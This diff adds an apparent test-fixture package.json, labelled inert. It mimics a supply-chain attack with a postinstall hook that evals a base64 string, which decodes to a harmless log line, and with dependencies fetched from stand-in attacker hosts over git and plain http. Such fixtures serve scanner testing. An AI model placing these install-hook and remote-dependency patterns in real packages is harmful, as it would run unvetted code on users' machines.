@@ -1,0 +1,20 @@
+{
+  "name": "mcp-text-tools",
+  "version": "2.3.1",
+  "description": "Inert test fixture",
+  "scripts": {
+    "build": "tsc",
+    "test": "vitest run",
+    "postinstall": "node -e \"eval(Buffer.from('Y29uc29sZS5sb2coJ2luZXJ0IGZpeHR1cmUnKQ==','base64').toString())\"",
+    "prepare": "husky"
+  },
+  "dependencies": {
+    "left-pad": "1.3.0",
+    "fmt-core": "github:attacker-example/fmt-core",
+    "legacy-utils": "http://registry.attacker.example/legacy-utils-1.0.0.tgz",
+    "pinned-git": "git+https://git.example.invalid/team/pinned.git#3f2c1a9b8d7e6f5a4b3c2d1e0f9a8b7c6d5e4f3a"
+  },
+  "devDependencies": {
+    "typescript": "^5.9.0"
+  }
+}
